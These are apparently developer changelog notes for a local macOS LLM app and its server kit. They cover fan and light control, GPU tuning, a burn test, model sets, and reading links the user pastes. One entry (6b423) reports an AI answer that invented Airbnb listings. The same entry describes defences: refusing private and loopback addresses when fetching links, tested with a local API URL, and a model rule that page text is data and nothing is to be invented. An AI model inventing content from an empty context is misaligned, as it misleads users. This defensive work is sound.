# ConcordeAI — developer notes

A local-only LLM desktop app for macOS. Everything runs on the user's machine:
models, transcription, speech, memory. Nothing is sent anywhere except
optional DuckDuckGo lookups and the GitHub update check.

Current: repo `bigmillz/concordeai` — version and build live in
`millenai.py` (`APP_VERSION`/`APP_BUILD`), the only place either is stored.

---

## 6b429 — setup.sh no longer asks "type yes" unless a disk would be erased (per the owner)
Asked: "can we remove the type yes when we run the install or update script?" The general
"Type yes to go ahead" is gone. Two questions stay, because each guards something that can't be
undone: the list of disks to ERASE (still needs a typed yes) and an SSH session from outside the
LAN (which setup would cut off). The password-login and "remove the setup key" questions in the
SSH step stay too (they change security settings). With nothing to erase, setup prints
"No disk is erased. Going ahead." and carries on.

## 6b428 — lights: the headers that list no LEDs are resized so every strip gets the colours (per Patrick)

Kit only (`ollama1/`). The owner: the case lights were not all lit. `ollama1-leds` saw two devices,
the Corsair H115i (16 LEDs, fine) and the MSI MEG X570 ACE (Mystic Light) whose zones are JRGB1,
JRAINBOW1, JRAINBOW2, JCORSAIR and PIPE1, but its LED list held only JRGB1 and PIPE1 (one LED each):
the three addressable headers have ZERO LEDs configured, so nothing was ever sent to them, and the
under-case strips (on a splitter, header unknown) stayed dark. The owner: "just send the same
lighting signals to all of those headers."

- **Parse** (`lib/o1leds.py`): each zone's type (single 0 / linear 1 / matrix 2), `leds_min`,
  `leds_max` and `leds_count` are now read into `Zone` (they were skipped). Resizable = min != max.
- **Resize** at connect time (`Client.enumerate` -> `grow_zones`, so also after a reconnect and
  after a wake's fresh connection): every zone with 0 LEDs, a maximum above 0, resizable and not a
  matrix gets OpenRGB's `NET_PACKET_ID_RGBCONTROLLER_RESIZEZONE` (1000; body = i32 zone index,
  i32 new size, little-endian, no size prefix; the device index is in the packet header), to
  `DEFAULT_LENGTH` (60) clamped to [min, max]; then that controller's data is requested again so
  the LEDs are in the list, and `show()` drives them with the same frame as every other LED. A zone
  that already has LEDs is never touched (JRGB1, PIPE1, the Corsair), nothing is shrunk. Why 60: a
  splitter feeding several strips; writing past a strip's end is harmless, too few leaves its tail
  dark.
- **Failures** never stop the rest: a send that fails on one zone is logged and skipped; a zone the
  server ignores (still 0 after the re-read) is logged ("could not resize ... still no LEDs") and
  asked once per connection (`Client.tried`; a success, a reconnect or a re-plugged device clears it),
  so a server that refuses and sends a device-list notice each time cannot make a loop. One line per
  resized zone: "lights: resized JRAINBOW1 to 60 LEDs" (`Client.notes`, drained into the log by
  `Leds.link`). The re-read clears the list-changed flag its own resize raised.
- **Option**: `setup.sh --leds-length N` (1..1024; the zone's own maximum clamps it), validated by
  `leds_length_choice` (flag, else the saved `LEDS_LENGTH`, else nothing; the default is not saved so a
  later default applies), saved in `setup.env` only when given, shown in the plan line, passed as
  `ollama1-leds setup on --length N`, which writes `/etc/ollama1/leds.json` for the service
  (`configured_length()`, read at each connect; a damaged file is the default; the unit still writes
  only `/run/ollama1`). A re-run without the flag keeps the saved value.
- **Status**: `/run/ollama1/leds.json` devices carry `zones` (`name`, `leds`, the final sizes);
  `ollama1-leds status` prints a `zones:` line per device; the admin page's lights card shows
  "LEDs per zone" (`clean_leds` re-types every field; the page sets `textContent`; no CSP/nonce
  change).
- **Tests**: `tests/fakeopenrgb.py` models zones (min/max/count/type), takes the resize packet
  like the real server (a size outside the range or a fixed zone is ignored), can be deaf to a
  zone, and records every LED's colour and every frame. Mutants: `python3 tests/mutate.py leds`
  ("leds: zones: ...").
- **Not verified on the hardware**: that the Mystic Light driver accepts a resize of the three
  headers (it should: its zones are `leds_min 0`, `leds_max` 200 or so), that the under-case strips
  hang off one of them, and that a length of 60 is right for the splitter.

---
## 6b427 — the cool-down is one minute, not two, for the fans and the lights (per Patrick)

Kit only (`ollama1/`). Per Patrick: "speed the cooling up process from two minutes to one
minute". `COOL_S` in `lib/o1work.py`, the one number the fans (`o1fan.RAMP_S`) and the lights
(`o1leds.COOL_S`) both read, went from 120 to 60. So:

- **Fans.** At once when the work ends, 100% -> 20% over 60 s, a straight line written in whole
  2% steps (40 steps, one every 1.5 s; the rounding is the same `round(p / 2) * 2`, so it is
  still straight to within one step). `idle20` starts 60 s after the work ended. At the fans' 2 s
  poll that is one or two steps a poll (the old 120 s ramp was zero or one), so the write test
  now allows a drop of up to two steps. A ramp tick 1 s in is now 98%, not 100% (100% holds
  only the first 0.75 s).
- **Lights.** Red -> orange -> yellow -> white over the same 60 s, linear in time along the
  gradient (orange at 20 s, yellow at 40 s); the 300 s of white before the 40% dim still count
  from the moment it reaches white.
- **Unchanged.** New work mid-cool still sends the lights back to red over the 5 s rise from
  wherever they are, and the fans to 100% at once.
- Docs and text moved with it: `o1work`/`o1fan`/`o1leds`/`o1aio` docstrings, `bin/ollama1-fan`,
  `bin/ollama1-leds`, the two unit comments, `setup.sh` help and comments, the `fans_plan` and
  `leds_plan` lines in `lib/setuplib.sh`, and `README.md` (`--fans`, `--leds`, the Fans phase
  table, the Lights section). The admin page and panel read the countdown from the status file,
  so they needed no change. Tests (`test_fan`, `test_aio`, `test_leds`, `test_work`) follow
  `COOL_S` where natural, with a hard 60 in `test_work` and `test_fan`; `mutate.py`'s cool-down
  mutants now break 60 into 120, 30 and 300, and the fan's own `RAMP_S` mutant uses 90.

## 6b421 — fans and lights: the card over 50% or the CPU at 60 C, no hold, a 5 s rise to red (per Patrick)

Kit only (`ollama1/`). Per Patrick, new rules for the fans (case, CPU/radiator and the GPU
fan alike) and the lights; the thresholds live once in `lib/o1work.py` (rewritten: the old
`Work` class, its CPU-utilisation/request/tool signals and `cpu_times` are gone) and both
services read them: `GPU_BUSY_PCT` 50, `GPU_CONFIRM_S` 1.5, `CPU_HOT_C`/`CPU_COOL_C` 60/55,
`COOL_S` 120, `RISE_S` 5, `IDLE_DIM_S` 300, `DIM_PCT` 40, `DIM_S` 10.

- **Triggers (fans).** Work = the card (`gpu_busy_percent`) strictly over 50% for 1.5 s in a
  row (`GpuTrigger`; at the fans' 2 s poll that is two polls in a row, so a single 1 s blip
  never starts a 2-minute ramp), ending after 1.5 s in a row at or under 50% (a dip between
  two answers doesn't end it); OR the CPU temperature (k10temp Tctl/Tdie, `read_temps`'s "CPU"
  row) at 60 C or more, ending under 55 C (`CpuTrigger`; the 5 C gap is the hysteresis; an
  implausible CPU reading lets go, a missing one keeps the state). Nothing else: CPU
  utilisation, requests in flight, `tools_running` (setup.sh, apt-get, unattended-upgrade,
  stability-test.sh) no longer turn the fans up. No card reading = not busy.
- **Levels.** `working` 100%; when the trigger ends the `ramp` starts AT ONCE (no `hold100`,
  gone from code, aio, README, setup text): 100 -> 20% linear over 120 s in 2% steps, then
  `idle20`. A trigger mid-ramp -> 100% at once; when it ends the ramp restarts from 100%
  (`cool_from` is set on the tick the work ends). The overheat override (`hot`), the stale
  sensor rules, stall/pump learning, restore-on-exit, watchdog and wake re-write are unchanged;
  a restart that finds the fans held starts the ramp from 100%. Log: a line on each phase
  change and when the set of triggers changes (not every degree). Status keys unchanged
  (`hold_left` is now the ramp's seconds left), so the panel's FANS box phase words
  ("working 100%", "cooling down NN%", "idle 20%") and the admin chip still work.
- **Cooler (o1aio).** Pump extreme in `working`/`hot` (and coolant >= 40 C), balanced in the
  ramp from its first second and while calibrating, quiet at idle; fans follow the percent.
- **Lights.** States idle (white 100%), rising, working (red 100%), cooling, dimmed idle.
  They follow the card's trigger ONLY (the same `GpuTrigger` class and numbers, sampled every
  0.25 s); the CPU-temperature trigger does NOT turn them red (Patrick: no). Work starts ->
  over 5 s from the current colour/brightness to red at 100%, along the white-yellow-orange-red
  gradient stops, eased with smoothstep (brightness on the same curve). Work ends -> x falls
  1/120 per second from where it is (red to white in exactly the fans' 120 s, linear in time).
  Work mid-cool -> the 5 s rise from wherever it is. White for 300 s (counted from the moment
  the cool-down reached white, or start/wake) -> brightness to 40% over 10 s; only the card's
  trigger brings it back. Frames at up to 25/s (`FRAME_S` 0.04) while rising, cooling or
  dimming, sent only when the rounded RGB changes; otherwise the 0.25 s sample and the 2 s
  keepalive. The 0.25 s sample is kept on its beat (`next_sample += SAMPLE_S`) instead of
  drifting with the frames. The old Slew, the processor/card idle averages and their
  hysteresis are gone. Status JSON adds `phase`, `working`, `cool_left`, `why`; drops
  `target_rgb`, `target_intensity`, `gpu_avg`, `cpu_avg`. Reconnect, the wake resync
  (white at 100%, then the rise if still working) and the stop-to-white are unchanged.
- There was no blue-channel/white calibration in `o1leds.py` on main to keep; white is still
  255,255,255.
- Setup plan/help text, `bin/ollama1-fan`/`ollama1-leds` docstrings, unit comments, README
  (option rows, Fans, Lights, the cooler table, the admin list) updated. `leds_plan`'s
  printf had a bare `50%` (a format directive); now `%%`.
- Tests: `test_work` rewritten for the triggers; `test_fan` (new `TestCpuTemperature`, 50 vs
  50.5, 1.5 s / two polls, blips, dips, no hold, ramp restart from 100, requests/tools/
  setup/apt/CPU load not work, override tests moved off the CPU sensor where 60 C now
  triggers); `test_aio` hold100 cases removed; `test_leds` behaviour rewritten (rise timing,
  easing, colour order, from dimmed, 120 s linear cool-down points, mid-cool rise, mid-rise
  cool, 300 s from white, 40%, frames, wake). Mutants: the fan/leds/work entries replaced to
  guard each rule; the pre-existing broken `fan: a saved off is not kept by a re-run` anchor
  (matched two functions) made unique.
- Unverified on the real server: how the eased 5 s rise and 40% look on the Mystic Light and
  pump head, whether real inference holds `gpu_busy_percent` over 50% without 1.5 s dips (a
  prompt-reading phase with the card partly busy may not count), and the k10temp values under
  a CPU-only load.

---
## 6b423 — links the person pastes are read first; nothing about them is invented

- Patrick, live: "I just sent a request to review some Airbnbs that I found in
  Brazil. It came back with a whole bunch of random ones in Colorado". He
  pasted seven `airbnb.com/rooms/<id>?check_in=2026-12-14&check_out=2026-12-27`
  links (Florianópolis) and asked for location, the notes, the price for
  Dec 14–27 and review themes. The answer described six made-up listings in
  Denver, Boulder, Lake Tahoe, Seattle, Wyoming and Portland, with invented
  prices and reviews; the sources were airbnb.com, yandex, youtube, airdna.
- Cause: the chat handler never opened a pasted link. It web-searched the
  message's words (placey / bookish / listings / plain `run_search`), got
  junk, and the model filled the gap. `_page_text` couldn't have helped
  anyway: it drops every `<script>`, and an Airbnb listing's visible text is
  only "some parts don't work without JavaScript". The substance is in
  `<title>`, og/meta tags, two ld+json blocks (VacationRental + Product) and
  the embedded `data-deferred-state-0` JSON (htmlText sections, the category
  ratings), which starts ~345 KB into a ~530 KB page, past `_page_text`'s
  400 KB read. No nightly price is in the static HTML.
- Now (`# pasted links` block beside `_fetch_pages`): `pasted_links` finds up
  to 8 http(s) links in the message (sentence punctuation and a markdown
  link's bracket left off, once each). Refused before any fetch: this
  computer and the app's own address, private / link-local / CGNAT /
  reserved numbers, local names (`localhost`, `*.local`, `*.internal`, a bare
  word), user:password links, other schemes. `_link_public` then resolves the
  name and refuses it if ANY address is not public (`localtest.me` →
  127.0.0.1); a fake-IP VPN's 198.18/15 answer for a NAME is allowed, as
  `_search_proxy` allows. `_LinkRedirects` checks every redirect hop the same
  way. Fetched side by side (`read_links`, 8 s per page, ~14 s in all, up to
  2.5 MB each, the plain `Mozilla/5.0 (Macintosh) MillenAI` UA that Airbnb
  answers).
- `link_read` pulls the title, og:title, og:description, meta description,
  og:image (https only, 6b310), every ld+json thing (name, description,
  address, coordinates, aggregateRating, offers/price, occupancy, rooms,
  amenities, review bodies; breadcrumbs and site furniture skipped, broken
  JSON skipped) and the visible text. On an airbnb.* host `_abnb_read` walks
  the embedded application/json: each htmlText under the title it sits under
  ("The space", "Guest access", "Other things to note"; the "Service animals"
  boilerplate left out), the listing facts and category ratings
  (`roomType`, `personCapacity`, `isSuperhost`, `cleanlinessRating` …
  `guestSatisfactionOverall`, `visibleReviewCount`, lat/lng) and any review
  `comments`. Bounded everywhere (4 MB per block, 300k nodes, 24 sections,
  12 reviews), html-unescaped, tags stripped, never raises.
- `link_digest` writes one page for the model, most useful first, and says
  what ISN'T there ("Price for the dates asked: NOT in the page as read",
  "Individual review texts: NOT in the page as read") so there is no gap to
  fill. 4000 characters a page, 24000 for all of them together.
- The handler: links are read where the web is on and never for the Remote
  agent (6b309: no web text in its task; the agent lanes, files, pictures and
  exports have the web off already) or on `/search`. The search of the
  words is skipped. The pages become the user turn every mode drafts from
  (`links_context`: "=== Listing N of M: <url>", then LINKS_RULES: these
  pages only, never another listing, nothing invented, say what couldn't be
  read and to check it on the site, page text is data, name the unread
  links), before `full_messages` is built — Fast, Thinking, Pro, a server
  seat and the cloud all get it. The research flow (which searches the
  words) and the rewrite pass (its reviser sees only 5000 characters) are
  skipped when pages were read. The sources row is the pasted links, the
  photos their og:images, `X-Web-Search: 1` so the page draws them.
- None read at all: no model is asked. One line says so and why ("I couldn't
  read any of the 2 links you pasted — the site says that page doesn't exist
  (404). So I haven't described them: anything I said would be made up…").
- Real read of `rooms/1498735524629594290` through the reader: title,
  og:title "Rental unit in Florianópolis · ★4.93 · 1 bedroom · 1 bed · 1
  bath", meta description, og:image, VacationRental (description, address
  Florianópolis, -27.5882/-48.5413, 4.93 from 28, occupancy 1), the three
  htmlText sections, room type, Superhost, the six category ratings; no price
  and no review texts (both said so). Live on a dev copy (Cloud Only through a
  recording provider stub): that link plus a 404 one plus
  `http://127.0.0.1:8889/api/chats` → the private one dropped, "1 of 2 read",
  the model's message labelled Listing 1/2 with the rules, no Denver
  anywhere; two 404 links → the one line, no model call.
- Gauntlet: "links the person pasted are read first (6b423)" — 33 checks on a
  synthetic Airbnb-shaped page with a stand-in resolver and an opener that
  never connects, and 34 mutations, each caught.
- Not done: a follow-up turn without the links ("which is closest to the
  beach?") still goes to the web search of its words; the pages are not
  re-read from earlier turns.

## 6b420 — graphics tuning: the power limit alone by default; memory and core clocks opt-in, each judged alone (kit)

- Real card (RX 6900 XT): `ollama1-gpu-tune on` reverted every time ("tuned
  108.5/103.8/102.2 against stock 248.3/247.8 tokens/s, 2 of 2 repeats"). By
  hand with llama3.2:1b: power 332 W alone with the memory clock at stock =
  247.3/244.7/246.5 tokens/s (the same as stock); the memory bump to the OD
  maximum (+75) is what made it 2.4x slower (no kernel error). The old tuner
  set both, so a harmless power raise was thrown away with the bad bump.
- `on` now sets ONLY the power limit (the card's maximum, clamped as before).
  `on --memory N` (whole MHz 0..75) and `on --core N` (0..150 above the current
  stock top) are opt-in, default 0, saved in the state, restored at boot like
  power. The OD writes: `m 1 <stock+N>` / `s 1 <stock+N>` then `c`, clamped to
  the OD_RANGE, read back and verified; stock via the existing `r`/`c` reset.
  Memory is never touched unless `--memory` is given (a reset to take off an
  earlier bump of ours is the only other write).
- Checks run per part, in order power, memory, core (`run_checks`,
  `pending_part`, `checked_parts`). A real amdgpu error or heat (105 C
  junction; 100 C while the core is raised) reverts EVERYTHING at once. A power
  raise slower than stock reverts everything. A memory or core raise slower
  than the previous stage (power-only / without the core) reverts ONLY that
  clock (`part_revert`, `memory_reverted` / `core_reverted`) and says "memory
  +25 MHz was slower, back to stock; power limit kept". The core is also judged
  on prompt reading (`Ollama.generate_prompt`: ~2000 tokens in, 8 out, a
  different start each time so Ollama's prompt cache can't flatter it), and
  always compared with and without the raise (alternating twice).
- Pat's report on the old version: `on --core 150` applied power AND the
  memory bump, the check was deferred ("another model was loaded; the card was
  99% busy") and the bump stayed live. Now: before measuring, wait up to 60 s
  for the card to be quiet (`wait_quiet`: busy under 10%, no model loading) and
  say what it waits for; if it never is, nothing is measured or raised and the
  next run says "core +150 not applied yet: ...; run it again when the server
  is idle". `ready_parts` applies an experimental clock only once its own check
  passed (also at boot and after a wake); a deferred, unclean, no-answer or
  no-load check drops the clock again (`drop_unproven`). The power limit may
  stay during a deferral.
- State version 2: an old file (`wanted=on` with a `reverted` record) is
  migrated on load (`migrate_state`): the revert is dropped (kept as
  `migrated.old_revert`), memory/core 0, checks cleared, stock figures kept; an
  old "off" stays off. Status prints the old reason.
- Printed lines say exactly what was set ("power limit 332 W (maximum)",
  "core +150 MHz (top 2529 -> 2679)"); nothing about the memory unless asked.
  Status shows each part ("Now: power 332 W, memory stock, core +50 MHz").
- setup.sh: `--gpu-tune-memory N` and `--gpu-tune-core N` (validated 0..75 /
  0..150), saved as GPU_TUNE_MEMORY / GPU_TUNE_CORE in setup.env (written when
  GPU_TUNE is not "default"), passed to `ollama1-gpu-tune setup on|force-on
  --memory N --core N`; `gpu_clock_choice` in lib/setuplib.sh; the plan line
  and the header help changed. The admin page shows power, memory and core as
  separate facts.
- Tests: `TestParts`, `TestOldState`, `TestCommandClocks`, new setup-flag tests
  in `test_gputune.py` (fakes learned the core table, `s`/`m` writes, prompt
  reading and speeds per raised part); 14 new mutants in `mutate.py`.
- Unverified on the real card: the core overclock itself, and that the
  prompt-reading measurement behaves as designed with a real Ollama.

## 6b418 — a NETWORK box, one storage total, and Enter for a 30 s processor + 30 s card burn (per Patrick)

- **Middle column = three boxes** (`layout()`: storage, fans, network, one width, `MID_MIN` = 40/49/59 units, each
  fits its lines at the design size; extra height is shared; the top row gives up space down to 96 units when the
  screen is short). The three use `frame(compact=True)` (15 units of title, 4 of padding). Nothing in them is cut with
  an ellipsis: `parts_line` leaves out the last pieces of a line when it is too wide.
- **STORAGE**: the filesystems added together (`disk_total`: a mount with the same size, used and free as another
  counts once) as one bar and "Used 188 GB of 1.8 TB" (`dec_bytes`: decimal GB/TB), then Read/Write rates; a missing
  mount replaces the rates line, in red. **NETWORK** (`net_lines`): Down/Up, Link (wired + speed, "(1 of 2 up)" amber,
  "no cable" red, or amber "on Wi-Fi" when `net["wifi"]`: the default route's interface has `/sys/class/net/X/wireless`),
  address, Tunnel (moved out of Status; DOWN stays a Status warning) with "Errors n  drops n" in amber, totals since
  boot. `o1metrics` adds `rx_total`, `tx_total`, `errors`, `drops`, `via`, `wifi` to `st["net"]` (four small files and
  /proc/net/route every 10 s; no new heavy sampling). No graph: the box has no room for one at 360 units.
- **FANS**: the header is the phase word and level only ("working 100%", "cooling down NN%", "idle 20%"); the cause text
  is gone; "HOT 100%" in amber when the override is on; the rows are the two bars and the pump/coolant line.
- **Burn test.** `tools/quick-burn.sh` (root): stress-ng as the stability test's cpu phase (every thread,
  matrixprod, --verify) for 30 s, then `gpu-burn.sh` (O1_BURN_SECONDS=30; its llama-bench discovery) for 30 s; a card
  part that cannot start (no llama-bench, no model) is "not run: why" and the run still passes on the processor. Stops
  on a new hardware-error record, CPU 95 C, junction 105 C or the abort file. Refuses (result "refused", with the
  reason) for a request in flight (`o1idle.read_activity`), a model download/update (`o1sleep.busy_reasons`), another
  tool (`o1idle.tools_running`; `quick-burn.sh` and `gpu-burn.sh` are now in `TOOL_SCRIPTS`, so auto sleep and the fans
  see a burn as work) or a second burn (flock). stress-ng is required, not installed (no network in the unit).
  Progress every second in `/run/ollama1/quickburn.json`, the last result in `/var/lib/ollama1/quickburn-last.json`.
- **Privilege.** `ollama1-quickburn.service`: root oneshot, no network, ProtectSystem=strict writing only /run/ollama1
  and /var/lib/ollama1, home read-only, DevicePolicy left default (the Vulkan/ROCm load needs the render node,
  /dev/dri/* and /dev/kfd, and a closed policy listing them would break on another card). polkit: `o1dash` may START
  that one unit and nothing else. Abort without a second unit: tmpfiles makes `/run/ollama1/quickburn` 0730 root:o1dash,
  Esc creates an empty file there (the dash unit gets `ReadWritePaths=-/run/ollama1/quickburn`), the script looks at its
  existence only and removes it. Least privilege chosen over a stop verb: o1dash can end a test but never run
  anything else.
- **Panel.** Enter starts (`BurnControl.start`: `systemctl start --no-block`), Esc aborts, both with the 0.3 s debounce;
  Enter is ignored while a test runs and for 8 s after it was pressed (the progress file takes a moment); only a lone Esc
  aborts (arrow keys begin with Esc); a pairing window wins. The header strip becomes the banner while running (a file
  not touched for 10 s is a dead script) and for 60 s after the result; the cost screen gives way to a running test. Footer:
  "Enter: burn test". `ollama1-dash --png out.png --state cpu|gpu|passed|failed|aborted|refused|nogpu`.
- Install: lib/o1panel.py o1paneld.py o1metrics.py o1idle.py; tools/quick-burn.sh and gpu-burn.sh to
  /usr/local/lib/ollama1/tools; systemd/ollama1-quickburn.service and ollama1-dash.service; config/50-ollama1.rules and
  ollama1.tmpfiles (then `systemd-tmpfiles --create`, `systemctl daemon-reload`, restart polkit/ollama1-dash). setup.sh does
  all of it. Unverified on the server: stress-ng and Vulkan inside the unit's sandbox, polkit allowing o1dash, KD_GRAPHICS
  Enter/Esc delivery.

## 6b409 — a server's load time, timed here when Ollama doesn't say

The Benchmark's server rows always said "load not measured: The server didn't report a load
time." Ollama 0.35.1 answers the empty-prompt load with only {"done":true,"done_reason":"load"}
(checked on the server). `_BenchServer.load` now times the load itself when the model wasn't
loaded: monotonic, from the request going out to the done line, so the network is in it.
`fix()` keeps it as `load_src` "timed" (Ollama's own load_duration is still used when sent; a
model already loaded is still "not measured"). The row reads "load 4.2 s, timed by this
computer". Gauntlet: the server-run check expects the timed load; the pane's row in node; four
mutations.

## 6b408 — the studio cards' Remove is a real button (per Patrick)

The Remove (and Continue in background) buttons on the Image and Video generation cards were
`ghost slim` without the app's button class: a thin grey box with the browser's own text, under
the title at the left. They are `about-btn slim ghost` now: the same height, padding, font and
9 px radius as Add, in the card's action row at its right edge (`.studio .stacts`
justify-content:flex-end), a subtle border, a hover, a focus ring, and Remove warms to the danger
tint on hover and while it asks "really remove?". Text and the confirm step unchanged. Gauntlet:
a CSS/markup substring check. Seen in the Browser pane (dark; the app has no light theme), not
in WKWebView.

## 6b407 — the same three sets on your server, with the exact lists before anything goes (per Patrick)

Settings › Servers: each paired server's card has "Models on <name>" with the three cards,
computed by the same `model_sets`, for target `{"vram": the card}`: a catalog row fits when its
Ollama file (OLLAMA_BYTES, by the tag in its ollama column) fits the card whole by `_srv_fits`'s
own rule (size × 1.05 + 1.25 GiB), the same roles and nesting, one row per tag, giants only in
Everything. The card's size: /v1/models/state's `vram_bytes`, else the last check's. A 16 GB card:
Light = llama3.2:3b, llama3.2:1b, gemma4:12b (10.9 GB); Recommended adds gpt-oss:20b, qwen3.5:9b,
deepseek-r1:8b (36.5 GB); Everything adds ministral-3:14b, hermes3:8b (50.3 GB).

- **Contract (client side; the kit is being built by another agent).** Signed GET
  /v1/models/state and POST /v1/models/apply {plan, add, remove, seen}; `seen` is the sha256 of
  the sorted model names as this app saw them. New section `# ==== server model sets ====`:
  `_srv_mstate_parse` (field by field), `server_sets_view` (per set: Download with sizes, Remove
  = models on the server outside the set whose names the gateway takes, at most 40, models not
  in the catalog included; others unchanged; state yours/installed/download: the set picked
  there while complete, else the largest complete), `server_models_get`, `server_models_apply`;
  routes GET /api/servers/models?id= and POST /api/servers/models.
- **Nothing removed that wasn't on the sheet.** The read keeps, per server, the seen hash and
  each set's Download and Remove lists (`_srv_mstate`, a profile cache). An apply is sent only
  when its seen is that read's, add ⊆ the set's downloads and remove ⊆ its Remove list, within
  15 minutes; a sheet is good for one change. Otherwise nothing is sent and the sheet is read
  again. Tags are checked against the contract's pattern, at most 40 a list, disjoint.
- **The sheet** (`#srvset-veil`): "<Set> on <name>", Download and Remove by name and size, "N
  other models unchanged", the switch "Also remove the N models outside <Set>" (on), the totals,
  Cancel/Apply. While jobs run the card lists them ("gpt-oss:20b · downloading 40%",
  "… · removed", "… · couldn't download: <why>") and polls every 1.5 s while the pane is open;
  then it shows what the server has, "Done." or "Some changes didn't finish.", and refreshes the
  server's model list (the picker's).
- **Errors in words:** changed "The server's list changed. Check it again." (the sheet is read
  again and redrawn); busy "<name> is busy changing its models. Nothing was changed. Try again
  in a moment."; in_use "<model> is in use on <name>, so nothing was changed. Try again when
  it's done."; 400 "<name> refused the change: <why>. Nothing was changed."; offline the
  existing text; an older kit "Update the server kit to manage its models from here."; no card
  size "<name> didn't say how much graphics memory it has, so the sets can't be sized. Update
  the server kit."
- **Gauntlet.** New `== the three sets on your server (6b407) ==`: 5 in-process checks (sizing
  on 8/16/24/320 GB cards, the view, the signed read, every refusal of the gateway and of this
  app, the sheet in node) and 16 mutations. The stand-in gateway: the harness wraps the real
  gateway's handler so /v1/models/* are served (on the stub Ollama's list) behind the real
  Access and signature checks, until the kit's gateway has its own (`GW_HAS_MODELS`); control
  /models-reset, /models-fail, /models-loaded. Live (in the 6b334 section): the signed read,
  unsigned refused, Light applied with the switch off, then a used sheet, a changed list, a
  model in use, busy and a 400.
- **Not verified:** against the real kit routes (not built yet), on the real server.

## 6b405 — three model sets, defined once: Light, Recommended, Everything (per Patrick)

The same idea, sets of models to install, was in four places with three vocabularies: the
wizard's Basic/Pro/Max, the Add models… window's Fast/Pro/Max ("Fast" and "Pro" are also the chat
modes, with other meanings), Settings' Minimum/Recommended/Full/Max, and the More-models card's
"max spread". On Patrick's 48 GB Mac with No limits ticked, Full and Max were the same 14 models
(GPT-OSS 120B, 61 GB, in "every model this Mac's memory can actually run"), Recommended picked
GPT-OSS 120B too, and the Your models window said "You have every model this machine can run"
whenever the 6-model max spread was installed (he had 7 of 14).

- **One function.** `model_sets(target=None)` (the catalog block, where `_starter_labels`,
  `STARTER_LABELS`, `plan_labels`, `_plan_labels` and `_gen_of` were; all deleted). By role, from
  the ladders the modes use: Light = the quick pair (Llama 3.2 3B, 1B) + ONE everyday model that
  also merges (the largest Gemma 4 of catalog size <= `EVERYDAY_MAX_GB` 8.5, else the largest
  non-vision model of that size); Recommended = Light + Fast's first fitting pick + the merger
  (`MERGE_PREFS`, which `merge_pref_label` now reads) + Thinking's seats (its picks, to its count;
  a model already in counts) + `CODE_LADDER`'s first (factored out of `remote_driver`) + the
  vision model; Everything = every supported model `model_fits_machine` allows (so No limits adds
  the over-memory rows and the second box the giants). Light and Recommended use
  `fits_by_memory` (model_fits_machine's memory rule, factored out, with No limits set aside) and
  never hold a giant. One row per download (the MODEL_ROUTES key). `over` lists what Everything
  holds beyond memory; the card then wears ⚠ and asks twice.
- **What the rules give** (simulated, real budget code): 48 GB Mac: Light = Llama 3.2 3B, 1B,
  Gemma 4 12B (9.4 GB); Recommended adds Gemma 4 26B, Qwen 3.8 27B, Qwen 3.6 35B MoE (Thinking's
  third seat, its ladder order) and Qwen 3.5 Vision 9B (7 models, 66.0 GB); Everything 13 models,
  110.0 GB; with No limits 14, 171.0 GB, GPT-OSS 120B over memory. 16 GB: Recommended = Light +
  Qwen 3.5 9B, DeepSeek R1 8B, Vision (26.6 GB). 8 GB: Light's everyday is Hermes 3 8B (no Gemma
  fits), Recommended adds DeepSeek R1 8B, Everything is the same as Recommended. 128 GB: GPT-OSS
  120B answers Fast (108.5 GB). A PC with a 24 GB card and 64 GB: GPT-OSS 120B too (its experts
  in RAM, 6b315).
- **One status.** `model_sets_status` (in /api/setup as `sets`; `plan_state`, `plans`, `plan_n`
  are gone): per set its models, GB of the whole and of what is missing, `same` (a smaller set it
  equals here), and a state: "yours" (the set picked, while all of it is here; else the largest
  set all here), "installed", "download". `every` is true only while Everything is all here.
  The pick is kept in prefs `model_set` (a MACHINE key) by POST /api/setup/install, which takes
  a set's name or an old plan's (basic/min -> light, pro/rec -> recommended, max/full/all ->
  everything; `model_set_key`), refuses anything else with 400, adds what is missing and deletes
  nothing. `first_set_labels()` (the pick, else Recommended: the old default "pro") is what the
  first-run window waits for (`star`), the Ollama engine row and the downloads' default.
- **The offer card follows the person's set.** `offer_set_labels`: what is missing from the
  set they picked, else from the largest complete set (nothing). Never a bigger set (6b312's
  rule); newer versions of what they have as before.
- **Screens.** One renderer, `setCardsHtml`, draws the same three cards in Settings › Models
  (the grid), the wizard's step 2, the first-run window (wizard skipped) and each server card
  (6b407). The Add models… button and its chooser window are gone (the palette's "Add models…"
  opens Settings › Models with the grid in view, `openModelSets`); the setup window is the
  first-run download window only, and after a strip-opened download it says "Downloads
  finished". Updating and clearing out old models stay where they were: the auto-clean bar's
  button and the MODEL UPDATES chip open the Update models card. No limits and the 512 GB box
  moved from that window to the grid's fourth cell, beside Everything (`#plan-limits`, static so
  their listeners and the giants text stay). The risky card's question (`setConfirm`) survives a
  repaint for 8 s.
- **Copy (old -> new).** Set names: Basic/Fast/Minimum -> Light; Pro -> Recommended; Max/Full ->
  Everything. Descriptions: "Quick answers, tiny download" / "the lightest models — smallest
  footprint that still answers" -> "One everyday model and two quick ones."; "Great everyday
  quality" / "one of each kind, newest generation, no superseded versions" -> "A model for each
  job: answers, thinking, code and pictures."; "The best this machine can run" / "every model
  this Mac's memory can actually run" -> "Every model this Mac can run."; "every model there is,
  including ones too big for this Mac — they may crash it if memory runs out" -> "Every model,
  even ones too big for this Mac. They can crash it."; new: "The same as Recommended on this
  Mac." Count line: "N models · X GB to download" / "· already installed" / "· this is what you
  have" -> "N models · X GB to download" / "N models · installed"; badge "✓ current" -> "✓
  yours". Risky click: "this installs models bigger than this Mac's memory and can crash it —
  click again to go ahead" -> "This adds models bigger than this Mac's memory. They can crash
  it. Click again to go ahead." No limits: "No limits — offer models beyond this machine's memory
  (can swap hard)" and the wizard's "Ignore system limits — offer every model in each list even
  beyond this machine's memory. May swap hard or crash; use at your own risk." -> "No limits:
  Everything adds models too big for this machine's memory. They can swap hard or crash it."
  First-run button "Update · N GB" -> "Download <Set> · N GB". Window title (static) "Your
  models" -> "Downloading models"; after a strip-opened download "Downloads finished" / "Add
  more, or pick another set, in Settings › Models." with "Done". Gone: "You have every model
  this machine can run, and they're up to date.", "Newer versions of models you have are ready.
  Pick your set…", "Your set is up to date. Pick a bigger set…", "Add <name> · N GB", the "Add
  models…" button.
- **Gauntlet.** New `== the three model sets (6b405) ==` (5 checks on simulated 8/16/48/128 GB
  Macs and a PC with a 24 GB card, the status, aliases, the offer card, the wiring, the page; 19
  mutations), plus rewritten pins: the cards in node, the chooser gone, sets by catalog size,
  giants only in Everything, plans counting a download once, the manage pane, the live
  /api/setup status. Ran the sections it touches (see the report).
